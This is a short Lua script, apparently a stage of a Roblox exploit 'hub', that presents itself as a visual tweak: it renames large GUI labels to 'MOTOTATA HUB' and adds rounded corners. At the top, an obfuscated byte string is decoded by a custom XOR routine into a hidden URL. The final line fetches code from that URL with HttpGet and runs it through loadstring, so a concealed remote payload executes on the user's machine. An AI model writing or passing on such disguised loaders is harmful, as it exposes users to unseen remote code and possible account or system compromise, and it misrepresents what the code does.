
--[[ STAGE 2: VISUAL CORE ]]
local I6c2DD66WiUM5sZBqo="\141\116\119\126\130\206\220\223\143\159\144\236\166\179\155\186\160\186\166\175\188\182\200\207\211\188\206\220\197\034\224\231\232\045\241\243\247\243\250\245\000\255\009\247\005\081\017\004\028\025\036\011\032\040\043\111\048\047\058\060\126\033\015\023\035\076\082\079\090\041\040\074\088\091\095\059\058\113\090\100\118\115\080\122\184\127\134\182\190\200\197\220\157\135\158"local yvQGKIq3kUG0r=213 local EZyUZy01eQpd6pixDs0=187 local To6FKbuaOrQdBybll=0 local xokaGLI2CEUd1T2Wlaws1X=3 local bHJ_0JZSH5kvM28fPKkjL=18 local Siv6kapl7sYLl=false local QbCKtAoeoN7Tbb8CO=bit32 and bit32.bxor if not QbCKtAoeoN7Tbb8CO then QbCKtAoeoN7Tbb8CO=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Ah29rPMDyvimNaTOLZA6={}for PptiWmmIw_yoUkQwm=1,#I6c2DD66WiUM5sZBqo do local WMwyeOLPWmfBwg=string.byte(I6c2DD66WiUM5sZBqo,PptiWmmIw_yoUkQwm)local Ux37vMA9v5jle7REr=(EZyUZy01eQpd6pixDs0+(PptiWmmIw_yoUkQwm*xokaGLI2CEUd1T2Wlaws1X)+bHJ_0JZSH5kvM28fPKkjL)%256 if To6FKbuaOrQdBybll==0 then WMwyeOLPWmfBwg=(WMwyeOLPWmfBwg-Ux37vMA9v5jle7REr)%256 Ah29rPMDyvimNaTOLZA6[PptiWmmIw_yoUkQwm]=string.char(QbCKtAoeoN7Tbb8CO(WMwyeOLPWmfBwg,yvQGKIq3kUG0r))else WMwyeOLPWmfBwg=QbCKtAoeoN7Tbb8CO(WMwyeOLPWmfBwg,yvQGKIq3kUG0r)Ah29rPMDyvimNaTOLZA6[PptiWmmIw_yoUkQwm]=string.char((WMwyeOLPWmfBwg-Ux37vMA9v5jle7REr)%256)end end local JSEQi7TRzqnkfBgR881=table.concat(Ah29rPMDyvimNaTOLZA6)if Siv6kapl7sYLl then JSEQi7TRzqnkfBgR881=string.reverse(JSEQi7TRzqnkfBgR881)end local AFXu9PWQqPVdSU6=JSEQi7TRzqnkfBgR881
local HubName = "MOTOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(AFXu9PWQqPVdSU6))()
